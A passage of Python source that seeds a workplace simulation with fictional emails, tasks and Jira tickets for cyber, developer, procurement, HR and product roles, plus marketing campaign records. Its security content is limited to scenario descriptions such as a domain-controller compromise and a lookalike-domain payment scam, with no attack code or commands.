                {"id":"cyb-d5-e1","from_name":"Alex Kim","from_role":"CISO","from_email":"alex@shieldwall.io","subject":"DC compromise — full incident timeline by EOD","body":"Mimikatz on DC-01 + rogue Domain Admin overnight. Tier-0 compromise.\n\nI need the full timeline by EOD:\n• When did the chain start? (FIN-LAPTOP-12, day 1?)\n• Every host touched, every credential exposed\n• Recommended remediation (krbtgt rotation status, scope of password reset)\n• Whether we notify regulators (ICO 72-hour clock)\n\nDon't sugar-coat. Bad news fast beats good news slow.\n\nAlex","time":"06:00","read":False,"replied":False,"priority":"high","category":"info","requires_action":True},
                {"id":"cyb-d5-e2","from_name":"Finance — Tomas Wei","from_role":"CFO","from_email":"tomas@shieldwall.io","subject":"BEC attempt — confirmed?","body":"Got an email overnight allegedly from Alex asking me to wire £210k. Looked off — checked the domain (shieIdwall.io, capital I). I did NOT action. Can you confirm this was caught by your team?\n\nTomas","time":"08:30","read":False,"replied":False,"priority":"high","category":"info","requires_action":True},
            ],
            "tasks": [
                {"id":"cyb-d5-t1","title":"Full DC-01 compromise timeline","description":"Chain from Day 1. Hosts, creds, remediation, ICO notification call. CISO by EOD.","priority":"high","deadline":"17:00","status":"pending","points":45},
                {"id":"cyb-d5-t2","title":"BEC confirmation to CFO","description":"Confirm Alex-impersonation caught. Block lookalike domain.","priority":"high","deadline":"10:00","status":"pending","points":15},
                {"id":"cyb-d5-t3","title":"Week retro — top 3 detection gaps","description":"What did we miss? What slowed us down? 1-page memo for Monday.","priority":"medium","deadline":"Monday 09:00","status":"pending","points":15},
            ],
        },
    },
    "developer": {
        2: {
            "emails": [
                {"id":"dev-d2-e1","from_name":"Jess Romero","from_role":"Engineering Manager","from_email":"jess@codecraft.dev","subject":"Hotfix landed — let's not break checkout again","body":"PR-3412 is in prod. Two follow-ups:\n1. Write a postmortem (template in /docs/incidents)\n2. Add a regression test that would have caught BUG-301 before merge\n\nDon't rush either — I'd rather lose a day than ship the same bug twice.\n\nJess","time":"08:30","read":False,"replied":False,"priority":"high","category":"task","requires_action":True},
                {"id":"dev-d2-e2","from_name":"Sam Patel","from_role":"Senior Dev","from_email":"sam@codecraft.dev","subject":"BUG-303 — saw your PR, two nits","body":"Looks good overall. Two nits in review:\n• Line 47 — that null check shouldn't be needed because the type guarantees non-null. Remove it.\n• Tests don't cover the discount-stacking case. Add one.\n\nLand by EOD and I'll approve.\n\nSam","time":"10:00","read":False,"replied":False,"priority":"medium","category":"teammate","requires_action":True},
            ],
            "tasks": [
                {"id":"dev-d2-t1","title":"Write checkout postmortem","description":"Template /docs/incidents. Root cause, timeline, action items.","priority":"high","deadline":"17:00","status":"pending","points":18},
                {"id":"dev-d2-t2","title":"Regression test for BUG-301","description":"Pre-merge gate. Should fail on the original buggy code.","priority":"high","deadline":"17:00","status":"pending","points":15},
                {"id":"dev-d2-t3","title":"Address Sam's PR review on BUG-303","description":"Drop null check, add discount-stacking test.","priority":"medium","deadline":"17:00","status":"pending","points":10},
            ],
            "jira": [
                {"id":"BUG-305","type":"Bug","priority":"MEDIUM","title":"Sort dropdown loses selection after pagination","assignee":"unassigned","status":"open","reporter":"customer.support@codecraft.dev","source_alert":"","points":3,"description":"Listing page resets sort to default when user clicks page 2.","activity":[]},
                {"id":"FEAT-118","type":"Feature","priority":"MEDIUM","title":"Export CSV from reports view","assignee":"unassigned","status":"open","reporter":"product","source_alert":"","points":5,"description":"Customer ask × 6. Add server-side CSV export button.","activity":[]},
            ],
        },
        3: {
            "emails": [
                {"id":"dev-d3-e1","from_name":"Aaliyah Brown","from_role":"Customer Success","from_email":"aaliyah@codecraft.dev","subject":"Acme Corp — checkout still glitches for them","body":"Acme is on €€€ tier and very loud. They claim checkout fails when cart > 20 items even with yesterday's fix. Repro steps attached. They want a fix or a credit by Friday. CFO copied.\n\nAaliyah","time":"08:15","read":False,"replied":False,"priority":"high","category":"client","requires_action":True},
                {"id":"dev-d3-e2","from_name":"Jess Romero","from_role":"Engineering Manager","from_email":"jess@codecraft.dev","subject":"Sprint mid-point — confidence check","body":"Sprint 14 hits mid-point Friday. Drop a status per ticket (green/amber/red) and the realistic landing date. Don't sandbag — but no false greens either.\n\nJess","time":"09:30","read":False,"replied":False,"priority":"medium","category":"task","requires_action":True},
            ],
            "tasks": [
                {"id":"dev-d3-t1","title":"Reproduce Acme cart>20 issue","description":"Confirm bug, file ticket, propose fix or stop-gap.","priority":"high","deadline":"15:00","status":"pending","points":20},
                {"id":"dev-d3-t2","title":"Status all sprint tickets","description":"Honest RAG. Realistic dates. Comment on each.","priority":"high","deadline":"17:00","status":"pending","points":12},
                {"id":"dev-d3-t3","title":"Upgrade lodash — security CVE","description":"4.17.20 → 4.17.21+. Run tests, ship as small PR.","priority":"medium","deadline":"tomorrow","status":"pending","points":10},
            ],
            "jira": [
                {"id":"BUG-310","type":"Bug","priority":"HIGH","title":"Checkout fails when cart > 20 items (Acme)","assignee":"unassigned","status":"open","reporter":"aaliyah@codecraft.dev","source_alert":"","points":5,"description":"€€€ customer impact. Repro confirmed — array bound, off-by-one.","activity":[{"at":"2026-05-14T08:15:00Z","actor":"Aaliyah Brown","note":"Customer-reported, CFO copied"}]},
                {"id":"SEC-21","type":"Security","priority":"MEDIUM","title":"Upgrade lodash (CVE-2026-1923)","assignee":"unassigned","status":"open","reporter":"security-bot","source_alert":"","points":2,"description":"Prototype pollution. Upgrade path is clean.","activity":[]},
            ],
        },
        4: {
            "emails": [
                {"id":"dev-d4-e1","from_name":"Sam Patel","from_role":"Senior Dev","from_email":"sam@codecraft.dev","subject":"P95 latency spike on /reports","body":"Got an alert overnight — P95 on /reports went from 280ms → 1.4s. Started after your CSV-export PR landed. Investigate before more customers notice. Add caching if needed.\n\nSam","time":"07:45","read":False,"replied":False,"priority":"high","category":"teammate","requires_action":True},
                {"id":"dev-d4-e2","from_name":"Jordan Hayes","from_role":"Product Manager","from_email":"jordan@codecraft.dev","subject":"Demo blocker — Acme call tomorrow","body":"Demoing the new dashboard to Acme tomorrow 14:00 BST. The chart-zoom interaction breaks when the dataset has nulls. I need it stable by 12:00 tomorrow or I'm rehearsing a fallback.\n\nJordan","time":"10:30","read":False,"replied":False,"priority":"high","category":"task","requires_action":True},
            ],
            "tasks": [
                {"id":"dev-d4-t1","title":"Diagnose /reports P95 spike","description":"Was it CSV-export PR? Profile, add caching if needed.","priority":"high","deadline":"15:00","status":"pending","points":22},
                {"id":"dev-d4-t2","title":"Fix chart-zoom null handling","description":"Stable by 12:00 tomorrow — demo blocker.","priority":"high","deadline":"tomorrow 12:00","status":"pending","points":18},
                {"id":"dev-d4-t3","title":"Postmortem on BUG-310 (Acme cart)","description":"Was Acme bug a regression from yesterday's fix? Document.","priority":"medium","deadline":"17:00","status":"pending","points":10},
            ],
            "jira": [
                {"id":"PERF-44","type":"Performance","priority":"HIGH","title":"P95 latency on /reports — 280ms → 1.4s","assignee":"unassigned","status":"open","reporter":"sam@codecraft.dev","source_alert":"","points":5,"description":"Started after CSV-export merge. Likely N+1 or unbounded scan.","activity":[]},
                {"id":"BUG-314","type":"Bug","priority":"HIGH","title":"Chart zoom breaks on null values (demo blocker)","assignee":"unassigned","status":"open","reporter":"jordan@codecraft.dev","source_alert":"","points":3,"description":"Acme demo tomorrow 14:00 BST.","activity":[]},
            ],
        },
        5: {
            "emails": [
                {"id":"dev-d5-e1","from_name":"Jess Romero","from_role":"Engineering Manager","from_email":"jess@codecraft.dev","subject":"Sprint close — retro at 15:00","body":"Demo at 14:00, retro at 15:00. Prep 3 things to share:\n• Biggest win\n• Biggest unblock you'd want next sprint\n• One process change worth trying\n\nKeep it concrete. No abstract 'better comms'.\n\nJess","time":"08:00","read":False,"replied":False,"priority":"medium","category":"task","requires_action":True},
                {"id":"dev-d5-e2","from_name":"Jordan Hayes","from_role":"Product Manager","from_email":"jordan@codecraft.dev","subject":"Demo went well — Acme greenlit Q3 upsell","body":"Chart zoom held up. Acme is signing the £180k Q3 upsell. Massive — thank you. Drinks Friday on me.\n\nOne ask: pull the demo numbers (uptime, latency this week) so I can put them in the renewal deck.\n\nJordan","time":"15:30","read":False,"replied":False,"priority":"low","category":"info","requires_action":False},
            ],
            "tasks": [
                {"id":"dev-d5-t1","title":"Sprint demo prep","description":"Walk through merged work. 5 min slot.","priority":"high","deadline":"14:00","status":"pending","points":10},
                {"id":"dev-d5-t2","title":"Retro inputs","description":"3 concrete items: win, unblock, process change.","priority":"medium","deadline":"15:00","status":"pending","points":8},
                {"id":"dev-d5-t3","title":"Pull uptime/latency numbers for renewal deck","description":"For Jordan — Acme upsell.","priority":"medium","deadline":"Monday","status":"pending","points":10},
            ],
            "jira": [
                {"id":"TECH-72","type":"Tech Debt","priority":"LOW","title":"Migrate legacy v1 reports to v2","assignee":"unassigned","status":"open","reporter":"sam@codecraft.dev","source_alert":"","points":13,"description":"Q3 candidate. Document scope before refining.","activity":[]},
            ],
        },
    },
    "procurement": {
        2: {
            "emails": [
                {"id":"prc-d2-e1","from_name":"Laila Nasser","from_role":"Procurement Manager","from_email":"laila@techstack.co","subject":"Datacore PO — they're disputing the discount","body":"Datacore says their quote was 12% off list, our PO shows 8%. Pull the original RFP and the email chain. Friday call with their AE — be ready.\n\nLaila","time":"08:30","read":False,"replied":False,"priority":"high","category":"task","requires_action":True},
                {"id":"prc-d2-e2","from_name":"Eng — Theo Larsson","from_role":"Eng Manager","from_email":"theo@techstack.co","subject":"Urgent — laptop refresh for new engineers","body":"5 new starters next Monday. We need MacBook Pro 16\" (M4 Max) × 5. CapEx limit is £18k — fit it in or escalate to me. Don't make new hires wait on laptops.\n\nTheo","time":"10:00","read":False,"replied":False,"priority":"high","category":"task","requires_action":True},
            ],
            "tasks": [
                {"id":"prc-d2-t1","title":"Reconcile Datacore discount","description":"Pull RFP + email chain. Confirm 8% vs 12%. Friday call prep.","priority":"high","deadline":"Friday 14:00","status":"pending","points":18},
                {"id":"prc-d2-t2","title":"Quote MacBook Pro × 5","description":"Apple Business + 2 resellers. Best price under £18k.","priority":"high","deadline":"tomorrow","status":"pending","points":15},
                {"id":"prc-d2-t3","title":"Vendor scorecard — Q1 refresh","description":"Update 12 vendor scores using latest survey data.","priority":"medium","deadline":"17:00","status":"pending","points":12},
            ],
        },
        3: {
            "emails": [
                {"id":"prc-d3-e1","from_name":"Hugh Walker","from_role":"CFO","from_email":"hugh@techstack.co","subject":"Q2 forecast — find £40k of OPEX savings","body":"Board wants £40k pulled out of OPEX in Q2. Don't touch headcount. Look at SaaS overlap, dormant licences, contract terms with > 90 days notice. Propose 3 cuts by Friday EOD.\n\nHugh","time":"08:00","read":False,"replied":False,"priority":"high","category":"task","requires_action":True},
                {"id":"prc-d3-e2","from_name":"Datacore — Alex Mendoza","from_role":"Account Executive","from_email":"alex@datacore.com","subject":"Re: PO dispute","body":"We honour our quote. 12% is correct. I'm escalating to your VP if not resolved by Friday EOD.\n\nAlex Mendoza","time":"11:00","read":False,"replied":False,"priority":"high","category":"client","requires_action":True},
            ],
            "tasks": [
                {"id":"prc-d3-t1","title":"Identify £40k Q2 OPEX savings","description":"3 candidate cuts. SaaS overlap, dormant licences, contract notice.","priority":"high","deadline":"Friday 17:00","status":"pending","points":25},
                {"id":"prc-d3-t2","title":"Reply to Datacore AE","description":"Hold position OR concede to 10%. Document rationale.","priority":"high","deadline":"15:00","status":"pending","points":15},
                {"id":"prc-d3-t3","title":"Approve MacBook Pro PO","description":"Vendor chosen yesterday — issue PO today.","priority":"medium","deadline":"17:00","status":"pending","points":10},
            ],
        },
        4: {
            "emails": [
                {"id":"prc-d4-e1","from_name":"Laila Nasser","from_role":"Procurement Manager","from_email":"laila@techstack.co","subject":"Audit — 5 POs flagged for review","body":"Internal audit pulled 5 POs from the last quarter for review. Three were single-source over £25k with no waiver on file. Help me write a one-page justification per PO by Monday or we get a finding.\n\nLaila","time":"08:30","read":False,"replied":False,"priority":"high","category":"info","requires_action":True},
                {"id":"prc-d4-e2","from_name":"Security — Reza Patel","from_role":"Head of Security","from_email":"reza@techstack.co","subject":"New RFP — endpoint protection (Q2)","body":"Current AV contract ends June. Need an RFP issued by next Friday, 4 vendors, 2-week response window. Scope: EDR + XDR + 24/7 SOC. Budget £180k/yr ceiling.\n\nReza","time":"10:15","read":False,"replied":False,"priority":"medium","category":"task","requires_action":True},
            ],
            "tasks": [
                {"id":"prc-d4-t1","title":"Draft 3 single-source waivers (post-hoc)","description":"Audit-ready justification per PO. Don't make them sound defensive.","priority":"high","deadline":"Monday 09:00","status":"pending","points":22},
                {"id":"prc-d4-t2","title":"Endpoint protection RFP draft","description":"4 vendors, 2-week window, £180k ceiling. Send Reza for review.","priority":"medium","deadline":"next Friday","status":"pending","points":18},
            ],
        },
        5: {
            "emails": [
                {"id":"prc-d5-e1","from_name":"Hugh Walker","from_role":"CFO","from_email":"hugh@techstack.co","subject":"Week wrap — savings + dispute status","body":"By EOD, send me:\n1. Status on £40k Q2 savings — which 3 lines are confirmed?\n2. Datacore dispute outcome\n3. Audit waiver progress\n\nKeep it to 5 bullets.\n\nHugh","time":"08:00","read":False,"replied":False,"priority":"high","category":"task","requires_action":True},
                {"id":"prc-d5-e2","from_name":"Eng — Theo Larsson","from_role":"Eng Manager","from_email":"theo@techstack.co","subject":"Thanks for the laptop turnaround","body":"All 5 arrived this morning. New starters set up Monday. Owe you one.\n\nTheo","time":"09:30","read":False,"replied":False,"priority":"low","category":"info","requires_action":False},
            ],
            "tasks": [
                {"id":"prc-d5-t1","title":"CFO week-wrap email","description":"3 bullets: savings, dispute, audit. EOD.","priority":"high","deadline":"17:00","status":"pending","points":18},
                {"id":"prc-d5-t2","title":"Close out Datacore PO","description":"Either re-issue at 12% or document final rejected position.","priority":"high","deadline":"17:00","status":"pending","points":15},
                {"id":"prc-d5-t3","title":"Update vendor master after MacBook PO","description":"Add reseller terms. Tag preferred status if applicable.","priority":"low","deadline":"Monday","status":"pending","points":8},
            ],
        },
    },
    "hr": {
        2: {
            "emails": [
                {"id":"hr-d2-e1","from_name":"Diane Reyes","from_role":"VP Engineering","from_email":"diane@helixpeople.co","subject":"Tech Lead programme — where's the curriculum?","body":"You said yesterday this would be a 4-week curriculum. I want to see week 1 by tomorrow morning. If I don't have it, I'll commission externally — that's not a threat, it's a calendar issue.\n\nDiane","time":"08:00","read":False,"replied":False,"priority":"high","category":"info","requires_action":True},
                {"id":"hr-d2-e2","from_name":"Bootcamp Cohort 14","from_role":"Learner group","from_email":"cohort14@helixpeople.co","subject":"Module 3 is still broken","body":"Hi — 8 of us are still blocked on Module 3 (the React state lab). The reset you sent yesterday helped some, but the auto-grader is rejecting all submissions. Help?\n\nCohort 14","time":"09:30","read":False,"replied":False,"priority":"high","category":"client","requires_action":True},
            ],
            "tasks": [
                {"id":"hr-d2-t1","title":"Tech Lead curriculum — Week 1","description":"4 sessions, learning outcomes, pre-work. Diane wants it tomorrow.","priority":"high","deadline":"tomorrow 09:00","status":"pending","points":25},
                {"id":"hr-d2-t2","title":"Auto-grader fix — Module 3","description":"Bootcamp cohort blocked. Coordinate with platform eng.","priority":"high","deadline":"15:00","status":"pending","points":18},
                {"id":"hr-d2-t3","title":"Compliance push — chase 36% remaining","description":"Personalised nudge to 36 employees still missing training.","priority":"medium","deadline":"Friday","status":"pending","points":12},
            ],
        },
        3: {
            "emails": [
                {"id":"hr-d3-e1","from_name":"Diane Reyes","from_role":"VP Engineering","from_email":"diane@helixpeople.co","subject":"Week 1 — green-lit, here's week 2","body":"Curriculum week 1 looks good. For week 2, I want a guest speaker — VP-level industry name. You have a budget of £4k for a 90-min session. Get a name on paper by Friday.\n\nDiane","time":"08:30","read":False,"replied":False,"priority":"medium","category":"task","requires_action":True},
                {"id":"hr-d3-e2","from_name":"Learning Platform — vendor","from_role":"Vendor support","from_email":"support@learnplatform.co","subject":"Auto-grader fixed + post-mortem","body":"Fixed at 14:00 yesterday. Post-mortem attached. The bug was in our regex parser, not your config. Apologies.\n\nWe're offering 2 weeks free credit (£1,820 value) as compensation.\n\nLearn Platform","time":"09:45","read":False,"replied":False,"priority":"low","category":"info","requires_action":False},
            ],
            "tasks": [
                {"id":"hr-d3-t1","title":"Source week-2 guest speaker","description":"VP-level. £4k. 90 min. Name on paper by Friday.","priority":"high","deadline":"Friday","status":"pending","points":22},
                {"id":"hr-d3-t2","title":"Apply vendor credit","description":"£1,820 from Learn Platform — apply to next invoice.","priority":"low","deadline":"17:00","status":"pending","points":6},
                {"id":"hr-d3-t3","title":"Cohort 14 retention pulse","description":"Quick 5-question survey post-Module 3 fix.","priority":"medium","deadline":"Friday","status":"pending","points":10},
            ],
        },
        4: {
            "emails": [
                {"id":"hr-d4-e1","from_name":"Niamh O'Connell","from_role":"Head of People","from_email":"niamh@helixpeople.co","subject":"Q2 L&D budget — 8% cut threat","body":"Finance proposed an 8% L&D budget cut for Q2. I need a one-page defence: ROI on FY25 programmes, current Q1 utilisation, and the cost of cancelling Tech Lead mid-flight. Have it in my inbox by Monday 09:00.\n\nNiamh","time":"08:00","read":False,"replied":False,"priority":"high","category":"task","requires_action":True},
                {"id":"hr-d4-e2","from_name":"Learner — Tara Singh","from_role":"Bootcamp cohort 14","from_email":"tara@helixpeople.co","subject":"Complaint — Module 6 mentor unprofessional","body":"My mentor (J. Davies) made a comment in our 1:1 that crossed a line. I don't want to escalate formally yet but I want it on file. Can we meet?\n\nTara","time":"10:30","read":False,"replied":False,"priority":"high","category":"info","requires_action":True},
            ],
            "tasks": [
                {"id":"hr-d4-t1","title":"L&D budget defence memo","description":"FY25 ROI, Q1 utilisation, cost of Tech Lead cancellation. Monday 09:00.","priority":"high","deadline":"Monday 09:00","status":"pending","points":25},
                {"id":"hr-d4-t2","title":"Meet Tara — informal mentor complaint","description":"Active-listen. Document. Loop in Niamh per policy.","priority":"high","deadline":"tomorrow","status":"pending","points":15},
            ],
        },
        5: {
            "emails": [
                {"id":"hr-d5-e1","from_name":"Diane Reyes","from_role":"VP Engineering","from_email":"diane@helixpeople.co","subject":"Demo readiness — Tech Lead programme","body":"Demoing the 4-week programme to my leadership team at 15:00 today. I want you in the room. 10-min walk-through, 5-min Q&A. Bring the cohort metrics too.\n\nDiane","time":"08:00","read":False,"replied":False,"priority":"high","category":"task","requires_action":True},
                {"id":"hr-d5-e2","from_name":"Compliance — Auto","from_role":"System","from_email":"compliance-bot@helixpeople.co","subject":"Weekly compliance update — 78% complete","body":"This week: 64% → 78%. Remaining 12 employees flagged for line-manager escalation.\n\nCompliance Bot","time":"09:30","read":False,"replied":False,"priority":"low","category":"info","requires_action":False},
            ],
            "tasks": [
                {"id":"hr-d5-t1","title":"Tech Lead demo prep + delivery","description":"10-min walk-through, 5-min Q&A. Bring cohort metrics.","priority":"high","deadline":"15:00","status":"pending","points":25},
                {"id":"hr-d5-t2","title":"Line-manager escalation list","description":"12 employees still non-compliant. Send personalised manager-CCed nudge.","priority":"high","deadline":"17:00","status":"pending","points":12},
                {"id":"hr-d5-t3","title":"Week wrap to Niamh","description":"Bullets: Tech Lead status, compliance %, Tara case progress, Q2 budget defence.","priority":"medium","deadline":"Monday 09:00","status":"pending","points":12},
            ],
        },
    },
    "pm": {
        2: {
            "emails": [
                {"id":"pm-d2-e1","from_name":"Brendan Carr","from_role":"VP Sales","from_email":"brendan@northwindcloud.io","subject":"Pricing test — CEO wants the recap","body":"CEO is asking why we 'celebrated' the pricing win then quietly walked it back. He wants a clean recap by tomorrow EOD: what really happened, what we're keeping, what we're scrapping.\n\nDon't make me look bad — but don't lie either.\n\nBrendan","time":"08:30","read":False,"replied":False,"priority":"high","category":"info","requires_action":True},
                {"id":"pm-d2-e2","from_name":"Drew Patel","from_role":"Senior Analyst","from_email":"drew@northwindcloud.io","subject":"Conversion double-count — full root cause","body":"Found it. The pricing-page test pixel was firing on both the marketing site AND the post-signup confirmation, so every conversion counted twice. Real lift: +3.2% (not +127%).\n\nSent to your inbox. I'll let you brief Brendan — figured you'd want to lead.\n\nDrew","time":"09:45","read":False,"replied":False,"priority":"high","category":"teammate","requires_action":True},
            ],
            "tasks": [
                {"id":"pm-d2-t1","title":"Write pricing-test recap memo","description":"Real lift +3.2%. What we keep, what we scrap. CEO-readable.","priority":"high","deadline":"tomorrow 17:00","status":"pending","points":25},
                {"id":"pm-d2-t2","title":"Brief Brendan before he sees memo","description":"Phone, not email. Take the hit before he's surprised.","priority":"high","deadline":"15:00","status":"pending","points":15},
                {"id":"pm-d2-t3","title":"Notify Drew — full credit","description":"Recognise him by name in the recap. Don't take his win.","priority":"medium","deadline":"tomorrow","status":"pending","points":8},
            ],
        },
        3: {
            "emails": [
                {"id":"pm-d3-e1","from_name":"Kai Tanaka","from_role":"Eng Lead","from_email":"kai@northwindcloud.io","subject":"Parental leave — my cover plan","body":"Starting parental leave Monday for 8 weeks. Cover plan attached:\n• Adam takes RM-502 (checkout flow)\n• Mei takes platform stability\n• I'll be unreachable except for P0\n\nPlease don't surface me on the org chart slide tomorrow — I'd rather not field 'congrats!' messages in standup.\n\nKai","time":"08:00","read":False,"replied":False,"priority":"high","category":"teammate","requires_action":True},
                {"id":"pm-d3-e2","from_name":"Brendan Carr","from_role":"VP Sales","from_email":"brendan@northwindcloud.io","subject":"My 3 roadmap commits — when","body":"You said you'd come back with the Sales Ask list by Wednesday. Today's Wednesday. I have a customer dinner Friday — I want to drop these on the table.\n\nBrendan","time":"09:30","read":False,"replied":False,"priority":"high","category":"task","requires_action":True},
            ],
            "tasks": [
                {"id":"pm-d3-t1","title":"Respect Kai's leave — slide and message scrub","description":"Pull him from org slide. Brief team via 1:1, not standup.","priority":"high","deadline":"tomorrow","status":"pending","points":15},
                {"id":"pm-d3-t2","title":"Sales commits — countercommit list","description":"3 things we will commit, 3 we won't. With reasons.","priority":"high","deadline":"Friday 12:00","status":"pending","points":25},
                {"id":"pm-d3-t3","title":"Customer panel synthesis","description":"Themes from 8 interviews this month. 3 patterns max.","priority":"medium","deadline":"Friday","status":"pending","points":18},
            ],
        },
        4: {
            "emails": [
                {"id":"pm-d4-e1","from_name":"Mara Wells","from_role":"CEO","from_email":"mara@northwindcloud.io","subject":"RM-502 — make it the story","body":"Sales pings, board pings — everyone wants to know what's working. Make RM-502 (the checkout-flow win) the Q2 story. Numbers, before/after, customer quote. 1 slide for the all-hands Friday.\n\nMara","time":"07:30","read":False,"replied":False,"priority":"high","category":"task","requires_action":True},
                {"id":"pm-d4-e2","from_name":"Adam Foley","from_role":"Senior Engineer","from_email":"adam@northwindcloud.io","subject":"RM-502 — what does 'done' look like for Q2?","body":"Took over from Kai this morning. Reading the spec — there are 3 plausible scopes here. Tell me which:\n(a) Mobile-only redesign\n(b) Full-funnel redesign (mobile + web)\n(c) Just the new payment-step UI\n\nDifferent engineering shapes for each. Need a decision by EOD or I'll start on (c) by default.\n\nAdam","time":"10:00","read":False,"replied":False,"priority":"high","category":"teammate","requires_action":True},
            ],
            "tasks": [
                {"id":"pm-d4-t1","title":"RM-502 all-hands slide","description":"Numbers, before/after, customer quote. Friday all-hands.","priority":"high","deadline":"Friday 09:00","status":"pending","points":22},
                {"id":"pm-d4-t2","title":"Choose RM-502 Q2 scope","description":"(a)/(b)/(c) with rationale. Adam by EOD.","priority":"high","deadline":"17:00","status":"pending","points":20},
                {"id":"pm-d4-t3","title":"Opt-out leak — closure note","description":"Confirm DSAR queue cleared. Notify Legal.","priority":"medium","deadline":"tomorrow","status":"pending","points":12},
            ],
        },
        5: {
            "emails": [
                {"id":"pm-d5-e1","from_name":"Mara Wells","from_role":"CEO","from_email":"mara@northwindcloud.io","subject":"Roadmap commit meeting — 14:00 today","body":"You, Brendan, me. 30 min. Bring:\n• The 3 Q2 commits (and what we're explicitly NOT doing)\n• RM-502 status\n• Pricing-test reset (Drew's analysis)\n\nDecisions made in the room are decisions kept. Don't bring 'we'll get back to you'.\n\nMara","time":"07:45","read":False,"replied":False,"priority":"high","category":"task","requires_action":True},
                {"id":"pm-d5-e2","from_name":"Brendan Carr","from_role":"VP Sales","from_email":"brendan@northwindcloud.io","subject":"Pre-meeting alignment?","body":"15 min before the CEO meeting? Want to make sure we're not contradicting each other in front of her.\n\nBrendan","time":"08:30","read":False,"replied":False,"priority":"high","category":"info","requires_action":True},
            ],
            "tasks": [
                {"id":"pm-d5-t1","title":"Q2 commit memo (final)","description":"3 commits, 3 explicit non-commits, success metric each.","priority":"high","deadline":"13:30","status":"pending","points":25},
                {"id":"pm-d5-t2","title":"Pre-align with Brendan","description":"15 min before CEO. Pick consistent narrative.","priority":"high","deadline":"13:45","status":"pending","points":12},
                {"id":"pm-d5-t3","title":"All-hands RM-502 slide — deliver","description":"Friday all-hands. CEO front row.","priority":"high","deadline":"Friday 16:00","status":"pending","points":15},
            ],
        },
    },
}

def _seed_marketing_artifacts(cfg):
    """Marketing campaigns + A/B tests + content calendar. Idempotent per sim."""
    _sim = sim_id()
    campaigns = [
        {"id":"camp_001","name":"NovaTech v2 Launch","status":"in_progress","platform":"LinkedIn",
         "scheduled":"2026-05-10","launch_date":"2026-05-10","end_date":"2026-05-24",
         "content":"","brand_colour":"#0D9488","tone":"bold and innovative",
         "target_audience":"B2B SaaS decision makers, UK+US, 30-50",
         "budget":12000,"spend":3420,"approval_status":"awaiting_review","approver":cfg["manager"]["name"],
         "metrics":{"impressions":184320,"clicks":4108,"ctr":2.23,"conversions":62,"cpa":55.16,"roas":3.8,"engagement_rate":4.1,"video_views":0},
         "ab_tests":[
            {"id":"ab_001a","variant":"A — 'Built for builders'","impressions":92160,"clicks":1843,"ctr":2.00,"conversions":24,"winner_status":"trailing"},
            {"id":"ab_001b","variant":"B — 'The fastest way to ship'","impressions":92160,"clicks":2265,"ctr":2.46,"conversions":38,"winner_status":"winner_pending_significance"},
         ]},
        {"id":"camp_002","name":"NovaTech v2 Launch","status":"scheduled","platform":"Twitter",
         "scheduled":"2026-05-10","launch_date":"2026-05-10","end_date":"2026-05-17",
         "content":"","brand_colour":"#0D9488","tone":"bold and innovative",
         "target_audience":"Engineering leaders, indie hackers","budget":4000,"spend":0,
         "approval_status":"draft","metrics":{"impressions":0,"clicks":0,"ctr":0,"conversions":0,"cpa":0,"roas":0}},
        {"id":"camp_003","name":"NovaTech v2 Launch","status":"draft","platform":"Instagram",
         "scheduled":"2026-05-10","content":"","brand_colour":"#0D9488","tone":"bold and innovative",
         "budget":3500,"spend":0,"approval_status":"draft","metrics":{"impressions":0,"clicks":0,"ctr":0,"conversions":0}},
        {"id":"camp_004","name":"Spring Newsletter — May","status":"scheduled","platform":"Email",
         "scheduled":"2026-05-08","launch_date":"2026-05-08","content":"5-section newsletter draft","brand_colour":"#0D9488","tone":"professional",
         "target_audience":"42,180 subscribers","budget":0,"spend":0,
         "approval_status":"awaiting_review","approver":cfg["director"]["name"],
         "metrics":{"sent":0,"opens":0,"open_rate":0,"clicks":0,"ctr":0,"unsubscribes":0},
         "ab_tests":[
            {"id":"ab_004a","variant":"Subject A — 'Your May toolkit is here'","sent":21090,"opens":0,"open_rate":0,"clicks":0,"winner_status":"pending"},
            {"id":"ab_004b","variant":"Subject B — 'We rebuilt onboarding (90s read)'","sent":21090,"opens":0,"open_rate":0,"clicks":0,"winner_status":"pending"},
         ]},
        {"id":"camp_005","name":"Q1 Brand Awareness","status":"completed","platform":"LinkedIn",
         "launch_date":"2026-01-15","end_date":"2026-03-31",
         "content":"3-month always-on awareness, 8 creatives","brand_colour":"#1E3A8A","tone":"professional and approachable",
         "target_audience":"Procurement, finance leaders","budget":35000,"spend":34218,
         "approval_status":"approved",
         "metrics":{"impressions":1240500,"clicks":45280,"ctr":3.65,"conversions":1872,"cpa":18.28,"roas":4.2,"engagement_rate":5.8}},
        {"id":"camp_006","name":"Creator Partnerships — NovaTech","status":"in_progress","platform":"TikTok+YouTube+Instagram",
         "scheduled":"2026-05-12","content":"3-creator launch push (1 TikTok, 1 YouTube long-form, 1 IG carousel)",
         "brand_colour":"#0D9488","tone":"bold and innovative","budget":7100,"spend":4700,"approval_status":"approved",
         "creator_briefs":[
            {"creator":"@MayaCreates","platform":"TikTok","followers":240000,"fee":2400,"deliverable":"1 x 60s POV","status":"signed"},
            {"creator":"@sam.builds","platform":"YouTube","followers":92000,"fee":2800,"deliverable":"1 x 8-12 min review","status":"draft_in_review"},
            {"creator":"@arianaonline","platform":"Instagram","followers":410000,"fee":1900,"deliverable":"3-slide carousel","status":"declined"},
         ],
         "metrics":{"impressions":0,"clicks":0,"ctr":0,"video_views":0,"engagement_rate":0,"affiliate_signups":0}},
        {"id":"camp_007","name":"Black Friday — Retargeting","status":"paused","platform":"Google Ads",
         "launch_date":"2025-11-20","end_date":"2025-11-30",
         "content":"Search + display retargeting","brand_colour":"#F59E0B","tone":"urgent",
         "target_audience":"Site visitors last 30d, abandoners","budget":18000,"spend":15640,"approval_status":"approved",
         "metrics":{"impressions":3800200,"clicks":52410,"ctr":1.38,"conversions":2104,"cpa":7.43,"roas":6.1}},
        {"id":"camp_008","name":"GDPR Consent Banner Update","status":"in_progress","platform":"On-site banner",
         "scheduled":"2026-05-09","content":"New banner draft per legal","brand_colour":"#0D9488","tone":"compliance-led",
         "target_audience":"All EU traffic","budget":0,"spend":0,
         "approval_status":"flagged","approver":"Legal","approval_note":"Cookie categories incomplete — consult Legal before publishing.",
         "metrics":{"impressions":0,"acceptance_rate":0}},
    ]
    for c in campaigns:
        c["simulation_id"]=_sim
    campaigns_col.delete_many({"simulation_id":_sim})
    campaigns_col.insert_many(campaigns)
    # Content calendar — 14 day window
    calendar=[
        {"id":"cc_001","date":"2026-05-07","channel":"LinkedIn","asset_type":"post","title":"NovaTech v2 — pre-launch teaser","status":"published","assignee":"you","campaign_id":"camp_001"},
